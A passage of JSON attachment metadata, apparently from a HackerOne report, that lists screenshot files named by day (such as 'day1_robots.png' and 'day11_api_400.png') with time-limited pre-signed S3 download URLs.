eYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=34a02d3cf99afb92fa23fb3fc7b3cfc82994fb242df9ada8cec540028087bc43"},{"id":1139713,"filename":"day11_api_204.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zpufj3dpl02wk1m8vfx2rkjt9xo9?response-content-disposition=attachment%3B%20filename%3D%22day11_api_204.png%22%3B%20filename%2A%3DUTF-8%27%27day11_api_204.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d3cde6cd1ff01eccf3aa68c21e4f89e86d94c21fd665f450c2d7d8a6a60bb051"},{"id":1139714,"filename":"day11_album.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p2dtcp0178av1aragcnj6zgn5v1n?response-content-disposition=attachment%3B%20filename%3D%22day11_album.png%22%3B%20filename%2A%3DUTF-8%27%27day11_album.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ec70c787b4b443dbc0138630dd4ca85f0b7bc24da4f53239ba568ff69b3877e9"},{"id":1139715,"filename":"day11_api_400.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7cerdttc50jnfw6siwww4574mfdm?response-content-disposition=attachment%3B%20filename%3D%22day11_api_400.png%22%3B%20filename%2A%3DUTF-8%27%27day11_api_400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f5f18e709052e0069be1b13e8921dc5d90e5ad3f18ceca5bb6fd7eb3a58c1a77"},{"id":1139716,"filename":"day11_api_detail_400.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4coiz02i4zvjmlqparaw3ec6ntb9?response-content-disposition=attachment%3B%20filename%3D%22day11_api_detail_400.png%22%3B%20filename%2A%3DUTF-8%27%27day11_api_detail_400.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ffa9fd526163763c8b6187885f0ccf60a5afa1434b7cbf3bac98615bfd0624bd"},{"id":1139718,"filename":"day1_robots.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0or255pnx1hicewjgbftnd5jzrxr?response-content-disposition=attachment%3B%20filename%3D%22day1_robots.png%22%3B%20filename%2A%3DUTF-8%27%27day1_robots.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=09b2fa1cf4096fde63771becaacfcd5a3284b79525e33f8022c234f8001b735e"},{"id":1139719,"filename":"day1_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1529pp0yek11zlv5uaevhs0at4wk?response-content-disposition=attachment%3B%20filename%3D%22day1_index.png%22%3B%20filename%2A%3DUTF-8%27%27day1_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2662dd611363d1e6d236d546d67e906cebb2430c6818aea19c5c5f6698d4ba75"},{"id":1139720,"filename":"day2_index.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ka1ewisjuffh1w5mqz3prwzmzcai?response-content-disposition=attachment%3B%20filename%3D%22day2_index.png%22%3B%20filename%2A%3DUTF-8%27%27day2_index.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ccbea58d812c81410b90417dbd98698ec0919ee7e348a474cc47e47ceca8ce63"},{"id":1139721,"filename":"day2_source.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fh9kdq217ezjrwq7xojji7lulglm?response-content-disposition=attachment%3B%20filename%3D%22day2_source.png%22%3B%20filename%2A%3DUTF-8%27%27day2_source.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5daf8fc9f26c344d29d7c75879b502d5682b9ff361bd7da461e7c27484795f78"},{"id":1139722,"filename":"day3_apps.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vbnqmc0bvti7lc7oputy7acow21v?response-content-disposition=attachment%3B%20filename%3D%22day3_apps.png%22%3B%20filename%2A%3DUTF-8%27%27day3_apps.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=801feeb12f7ccf3ad5f5f3c1a3a43ff23de05c3f58bbb6464fb2d57f9db32b06"},{"id":1139723,"filename":"day3_base64.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9oeesz65nw62v7rda648u3gcmang?response-content-disposition=attachment%3B%20filename%3D%22day3_base64.png%22%3B%20filename%2A%3DUTF-8%27%27day3_base64.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJF6VFL6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132105Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCID1So1KYRjOmBFJqLsqO1j9SSUCF9kJ%2FHqahOyDLmrnJAiAr2q5Z8bAgCyaCmyDSz7xwtmUTDOoz04myJOluBHRCeyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMvFUMWX6P00RsVarQKtcDflFFNScU3coA1YbnKy4lPXtwGDNsJcqhfcCTaePuAuK6nWvl5xRbjzjOBPvBHaTAnb2Iw%2B6Jdj2uyjmRMn%2F5%2F5AzD5di2wWOcC0am9iLaFmORG4VIVXTc8aAiiwqjNAu7dH2hTUNL9bwPzYUBq3%2FjwvNZUM%2FmpdXfugOwAP%2FP3w9e9PqozA16XzrwGIunimlg58HKZfOM0xp%2FESLFXRHAssX6DaYqQQyV5%2F0triAQeOx328GOBUjfGTiAl1aoS1J0%2FqN%2BmywXW%2FqqkEfAQ2n2f18dX2dkbwMnyQ4F47zR6jJw3CdBkeCPRDbbhcu8YGu2%2F%2BzzM9B4uguhR76M3KYB3dr919eRp%2F%2BcOfUxc8TC3gXMmp1jh0ywwC27sBrzUgZdh%2B2g4artPxRaRZPHbQvC%2F1OZ0MxZYsQmEItbUc65WqfO6PSdLbymEFDMyN5ona14j%2BaQHfp1MWNaO02I2WPYO5mZIsPuHjCO5MYUldcsrZMP7pydKVo87gkO2fPB2orxw1RGazxVwGy5R2PDIV7HsKH4KSOqhGLTTYcSjZvxzmTWIy013yrXhU3CEdFUoB7QifSN1bUli2cMIaUe7sr75onhlaNnQxqLv%2By7jqQ9RiOHvcMM4XIMInwkIsGOqYBzgDHFUI%2FtkToYUBHsGsXyI9vGkS81IUV4PSjgSfvCFIGR%2BPjro3EYi30Oc%2FQZijhik3H1oI82Vno5zo%2BVnueR7%2BkGCloKvMkJAe%2F77e%2BPPRDClquvRG9ERm7ELsd6WvljYOJTmuP4pWPW%2B2d%2BQu26lThNein0I5abJKiu%2FYvnXDmBeYAgLMwbyg9Lq3qT5qMKsr3i1aOgHcGHtYldnzNcLqwaNJYhw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bc5964315c789a46276f919ff20a8c34fd7ac4374f18da11dd83c8dd90cb0522"},{"id":1139724,"filename":"day5_files.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8wai7wx2v2rvybtlcejd0dv8unwl?response-content-disposition=attachment%3B%20filename%3D%22day5_files.png%22%3B%20filename%2A%3DUTF-8%27%27day5_files.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA25